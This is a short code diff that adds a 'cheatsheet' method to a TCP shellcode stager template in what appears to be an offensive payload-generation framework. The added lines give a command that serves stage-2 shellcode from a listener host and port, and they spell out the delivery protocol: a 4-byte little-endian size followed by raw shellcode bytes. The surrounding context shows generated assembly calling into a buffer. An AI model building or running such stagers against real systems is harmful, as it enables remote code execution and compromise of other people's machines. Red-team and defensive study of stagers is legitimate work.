@@ -157,3 +157,10 @@ class TcpStagerTemplate(PayloadTemplate):
             f"    call dword ptr {virt_buf}",
             "",
         ])
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Serve stage-2 shellcode",
+             f"python3 Tools/tcp_stage_server.py --lhost {config.lhost} --lport {config.lport} --payload emitter_out/bin/shellcode.bin"),
+            ("Protocol", "[4 bytes LE size][raw stage-2 shellcode bytes]"),
+        ]
